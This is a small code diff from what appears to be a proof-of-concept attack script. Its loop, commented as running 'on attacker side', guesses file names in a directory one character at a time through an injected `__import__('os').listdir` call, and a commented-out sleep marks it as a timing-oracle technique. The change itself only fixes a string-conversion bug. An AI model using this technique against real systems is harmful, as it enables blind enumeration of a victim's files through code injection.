@@ -165,7 +165,7 @@ for file_index in range(0,ndir):                             # This will be on a
         for ele in char_set:                                 # This will be on attacker side
             if __builtins__['__import__']('os').listdir(cdir)[file_index][char_index]==ele:
                 # __builtins__['__import__']('time').sleep(20)                                 # Real command
-                print(file_index + "file name is : " + ele + "\n")                             # For simplicity of this.
+                print(str(file_index) + "file name is : " + ele + "\n")                             # For simplicity of this.
                 if(ele == '\n'):
                     flag=1
                     break
